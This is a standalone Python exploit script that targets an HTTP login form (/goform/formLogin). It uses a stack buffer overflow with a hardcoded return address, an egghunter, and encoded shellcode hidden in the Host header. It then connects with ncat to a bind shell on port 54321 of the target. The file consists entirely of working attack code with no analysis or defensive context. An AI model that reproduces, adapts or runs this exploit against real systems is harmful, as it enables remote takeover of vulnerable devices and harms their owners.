#!/usr/bin/python

from socket import socket, AF_INET, SOCK_STREAM
from struct import pack
from sys import argv, exit
from time import sleep
from subprocess import call

try:
    host = argv[1]
except IndexError:
    print('[!] Usage: {} [ target_ip ] '.format(argv[0]))
    exit(1)

rekt =  ""
rekt += "\x49\x41\x49\x90\x42\x42\x91\x27\x91\x43\x48\x91\x9f"
rekt += "\xf9\xfc\x42\xf9\xf8\x37\xfd\xd9\xd0\xba\x1d\x95\x34"
rekt += "\xe1\xd9\x74\x24\xf4\x5e\x29\xc9\xb1\x53\x83\xee\xfc"
rekt += "\x31\x56\x13\x03\x4b\x86\xd6\x14\x8f\x40\x94\xd7\x6f"
rekt += "\x91\xf9\x5e\x8a\xa0\x39\x04\xdf\x93\x89\x4e\x8d\x1f"
rekt += "\x61\x02\x25\xab\x07\x8b\x4a\x1c\xad\xed\x65\x9d\x9e"
rekt += "\xce\xe4\x1d\xdd\x02\xc6\x1c\x2e\x57\x07\x58\x53\x9a"
rekt += "\x55\x31\x1f\x09\x49\x36\x55\x92\xe2\x04\x7b\x92\x17"
rekt += "\xdc\x7a\xb3\x86\x56\x25\x13\x29\xba\x5d\x1a\x31\xdf"
rekt += "\x58\xd4\xca\x2b\x16\xe7\x1a\x62\xd7\x44\x63\x4a\x2a"
rekt += "\x94\xa4\x6d\xd5\xe3\xdc\x8d\x68\xf4\x1b\xef\xb6\x71"
rekt += "\xbf\x57\x3c\x21\x1b\x69\x91\xb4\xe8\x65\x5e\xb2\xb6"
rekt += "\x69\x61\x17\xcd\x96\xea\x96\x01\x1f\xa8\xbc\x85\x7b"
rekt += "\x6a\xdc\x9c\x21\xdd\xe1\xfe\x89\x82\x47\x75\x27\xd6"
rekt += "\xf5\xd4\x20\x1b\x34\xe6\xb0\x33\x4f\x95\x82\x9c\xfb"
rekt += "\x31\xaf\x55\x22\xc6\xd0\x4f\x92\x58\x2f\x70\xe3\x71"
rekt += "\xf4\x24\xb3\xe9\xdd\x44\x58\xe9\xe2\x90\xf5\xe1\x45"
rekt += "\x4b\xe8\x0c\x35\x3b\xac\xbe\xde\x51\x23\xe1\xff\x59"
rekt += "\xe9\x8a\x68\xa4\x12\x60\x59\x21\xf4\xe2\x8a\x67\xae"
rekt += "\x9a\x68\x5c\x67\x3d\x92\xb6\xdf\xa9\xdb\xd0\xd8\xd6"
rekt += "\xdb\xf6\x4e\x40\x50\x15\x4b\x71\x67\x30\xfb\xe6\xf0"
rekt += "\xce\x6a\x45\x60\xce\xa6\x3d\x01\x5d\x2d\xbd\x4c\x7e"
rekt += "\xfa\xea\x19\xb0\xf3\x7e\xb4\xeb\xad\x9c\x45\x6d\x95"
rekt += "\x24\x92\x4e\x18\xa5\x57\xea\x3e\xb5\xa1\xf3\x7a\xe1"
rekt += "\x7d\xa2\xd4\x5f\x38\x1c\x97\x09\x92\xf3\x71\xdd\x63"
rekt += "\x38\x42\x9b\x6b\x15\x34\x43\xdd\xc0\x01\x7c\xd2\x84"
rekt += "\x85\x05\x0e\x35\x69\xdc\x8a\x45\x20\x7c\xba\xcd\xed"
rekt += "\x15\xfe\x93\x0d\xc0\x3d\xaa\x8d\xe0\xbd\x49\x8d\x81"
rekt += "\xb8\x16\x09\x7a\xb1\x07\xfc\x7c\x66\x27\xd5"

magic = 'hahahaha'
magic += rekt

egghunter = ''
egghunter += '\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c'
egghunter += '\x05\x5a\x74\xef\xb8\x68\x61\x68\x61\x8b\xfa\xaf\x75'
egghunter += '\xea\xaf\x75\xe7\xff\xe7'

crash = "A" * 256
crash += pack('<L', 0x7608BCCF)
crash += "B" * 20
crash += egghunter

payload = 'POST /goform/formLogin HTTP/1.1\r\n'
payload += 'Host: {}\r\n\r\n'.format(magic)
payload += 'HtmlOnly=true&Login=admin{}&Password=admin&loginButton=Submit+Login'.format(crash)

print('[+] Trying to exploit {}'.format(host))
try:
    s = socket(AF_INET, SOCK_STREAM)
    s.connect((host, 80))
    print('[+] Sending payload')
    s.send(payload)
    s.close()
    print('[+] Trying to connect to target')
    print('[+] Please wait thirty seconds...\n')
    try:
        sleep(30)
        call(['ncat', host, '54321'])
    except:
        print('[!] Whoops!! Something went wrong?')
except:
    print('[!] No can do says I!')
finally:
    print('\n[+] I <3 Shells!')
